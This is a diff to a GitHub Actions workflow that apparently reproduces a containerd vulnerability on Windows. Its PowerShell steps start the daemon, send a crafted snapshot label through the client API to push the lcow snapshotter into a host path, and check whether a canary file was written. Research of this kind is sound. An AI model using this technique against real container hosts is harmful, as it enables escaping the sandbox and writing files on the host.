@@ -32,18 +32,6 @@ jobs:
           [System.IO.File]::WriteAllBytes('C:\ctdpoc\go\main.go', [System.Convert]::FromBase64String($gomn))
           Write-Output '=== config ==='
           Get-Content 'C:\ctdpoc\config.toml'
-          Write-Output '=== go files ==='
-          Get-ChildItem 'C:\ctdpoc\go' | Select-Object Name,Length | Format-Table
-
-      - name: Start containerd
-        shell: pwsh
-        run: |
-          $base = 'C:\ctdpoc'
-          $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
-          Write-Output "CONTAINERD_PID=$($p.Id)"
-          Start-Sleep -Seconds 8
-          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
-          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'snapshotter'
 
       - name: Build Go harness (official containerd client)
         shell: pwsh
@@ -55,12 +43,21 @@ jobs:
           Write-Output "BUILD_EXIT=$LASTEXITCODE"
           Get-Item 'C:\ctdpoc\poc.exe' -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-List
 
-      - name: Trigger malicious snapshot Prepare (official client API)
+      - name: Start daemon + trigger malicious Prepare + capture (single step)
         shell: pwsh
         run: |
+          $ErrorActionPreference = 'Continue'
           $base = 'C:\ctdpoc'
           $loc = 'C:\ctdpoc\canary'
           $labelKey = 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location'
+          # start daemon in this SAME step so it stays alive
+          $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
+          Write-Output "CONTAINERD_PID=$($p.Id)"
+          Start-Sleep -Seconds 8
+          Write-Output '--- alive? ---'
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          Write-Output '--- plugins ---'
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'snapshotter'
           Write-Output "=== malicious label: $labelKey = $loc ==="
           & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-sandbox' $labelKey $loc 2>&1 | Tee-Object -FilePath "$base\prepare.out"
           Write-Output "POC_EXIT=$LASTEXITCODE"
@@ -71,7 +68,7 @@ jobs:
           Write-Output "HOST_FILE_WRITTEN=$(Test-Path $probe)"
           if (Test-Path $probe) { Get-Item $probe | Select-Object FullName,Length,LastWriteTime | Format-List; Get-FileHash $probe -Algorithm SHA256 | Format-List }
           Write-Output '=== daemon stderr tail ==='
-          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 40 }
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 60 }
 
       - name: Upload evidence
         if: always()
